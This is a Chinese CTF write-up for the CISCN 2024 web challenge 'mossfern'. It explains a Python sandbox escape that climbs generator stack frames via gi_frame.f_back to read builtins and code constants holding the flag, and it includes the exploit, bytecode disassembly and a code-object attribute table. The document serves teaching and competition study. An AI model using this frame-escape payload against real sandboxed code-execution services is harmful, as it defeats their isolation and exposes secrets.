---
title: CISCN2024-mossfern
published: 2025-12-13
description: 'CISCN 2024 初赛题mossfern的wp，一到简单的栈帧逃逸'
image: ''
tags: ['CTF', 'WP', 'WEB']
category: 'CTF'
draft: false 
lang: ''
---

> 小明最近搭建了一个学习 Python 的网站，他上线了一个 Demo。据说提供了很火很安全的在线执行功能，你能帮他测测看吗？

直接给出exp，还是十分简单的，这个解法可能是个小的非预期的解，因为好多过滤都直接忽视了：

```python
def a():
	g = (g.gi_frame.f_back.f_back.f_back.f_back for _ in [1])
	f = [x for x in g][0]
	code = f.f_code
	builtins = f.f_globals["_"+"_builtins_"+"_"]
	str = builtins.str
	print(str(code.co_consts).replace("}", "]"))
a()
```

注意这外层的`a()`函数的作用是形成闭包，防止在生成器的自引用时加载到全局变量以绕过字节码`LOAD_GLOBAL`的过滤，具体的原因我不多解释~~因为我也半知半解~~，这里贴出两种情况下生成器的反汇编码，有兴趣的可以看看：

```python title=包裹a()函数 {12}
[
    'Disassembly of <code object <genexpr> at 0x7f6b5ed42c30, file "<dis>", line 3>:',
    "  --           COPY_FREE_VARS           1",
    "",
    "   3           RETURN_GENERATOR",
    "               POP_TOP",
    "       L1:     RESUME                   0",
    "               LOAD_FAST                0 (.0)",
    "               GET_ITER",
    "       L2:     FOR_ITER                57 (to L3)",
    "               STORE_FAST               1 (_)",
    "               LOAD_DEREF               2 (g)",
    "               LOAD_ATTR                0 (gi_frame)",
    "               LOAD_ATTR                2 (f_back)",
    "               LOAD_ATTR                2 (f_back)",
    "               LOAD_ATTR                2 (f_back)",
    "               LOAD_ATTR                2 (f_back)",
    "               YIELD_VALUE              0",
    "               RESUME                   5",
    "               POP_TOP",
    "               JUMP_BACKWARD           59 (to L2)",
    "       L3:     END_FOR",
    "               POP_TOP",
    "               RETURN_CONST             0 (None)",
    "",
    "  --   L4:     CALL_INTRINSIC_1         3 (INTRINSIC_STOPITERATION_ERROR)",
    "               RERAISE                  1",
    "ExceptionTable:",
    "  L1 to L4 -> L4 [0] lasti",
    "",
]

```

```python title=无包裹 {10}
[
    'Disassembly of <code object <genexpr> at 0x7ff5d6b42c30, file "<dis>", line 2>:',
    "   2           RETURN_GENERATOR",
    "               POP_TOP",
    "       L1:     RESUME                   0",
    "               LOAD_FAST                0 (.0)",
    "               GET_ITER",
    "       L2:     FOR_ITER                61 (to L3)",
    "               STORE_FAST               1 (_)",
    "               LOAD_GLOBAL              0 (g)",
    "               LOAD_ATTR                2 (gi_frame)",
    "               LOAD_ATTR                4 (f_back)",
    "               LOAD_ATTR                4 (f_back)",
    "               LOAD_ATTR                4 (f_back)",
    "               LOAD_ATTR                4 (f_back)",
    "               YIELD_VALUE              0",
    "               RESUME                   5",
    "               POP_TOP",
    "               JUMP_BACKWARD           63 (to L2)",
    "       L3:     END_FOR",
    "               POP_TOP",
    "               RETURN_CONST             0 (None)",
    "",
    "  --   L4:     CALL_INTRINSIC_1         3 (INTRINSIC_STOPITERATION_ERROR)",
    "               RERAISE                  1",
    "ExceptionTable:",
    "  L1 to L4 -> L4 [0] lasti",
    "",
]

```


接下来就是通过`f_back`往下爬调用栈，这里`g.gi_frame`自引用得到当前生成器的栈帧，然后到`<listcomp>`列表推导式的栈帧，然后是当前整个函数的栈帧，然后是模块级的当前代码对象的栈帧，也就是`exec`执行的内容，最后是模块级的整个运行文件的代码对象的栈帧，也就是`app/uploads/THIS_IS_TASK_RANDOM_ID.py`。


我们使用`f_code`，来得到当前的代码对象本身，之后就是得到常量里的flag。


最后附上一张常用code对象属性的表，忘记了也可以通过`dir()`函数去查。

| 常用属性 | 作用 |
|-|-|
| co_argcount | 位置参数数量 |
| co_nlocals | 局部变量数量 |
| co_stacksize | 需要的栈空间 |
| co_flags | 标志位 |
| co_code | 字节码序列 |
| co_consts | 常量元组 |
| co_names | 名称元组 |
| co_varnames | 变量名元组 |
| co_filename | 文件名 |
| co_name | 名称 |
| co_firstlineno | 第一行行号 |
| co_lnotab | 行号表 |
| co_freevars | 自由变量名 |
| co_cellvars | 单元格变 |

---

**参考文献**

[利用生成器栈帧逃逸 Pyjail | CISCN 2024 mossfern 题解](https://www.pid-blog.com/article/frame-escape-pyjail)  
[Python利用栈帧沙箱逃逸 ](https://xz.aliyun.com/news/13075#toc-7)  
[Why are python generator frames' (gi_frame) f_back attribute always none? - Stack Overflow](https://stackoverflow.com/questions/41239455/why-are-python-generator-frames-gi-frame-f-back-attribute-always-none)  
[CISCN2024初赛 web wp | dawn_r1sing](https://dawnrisingdong.github.io/2024/07/16/CISCN2024%E5%88%9D%E8%B5%9B-web-wp/#mossfern)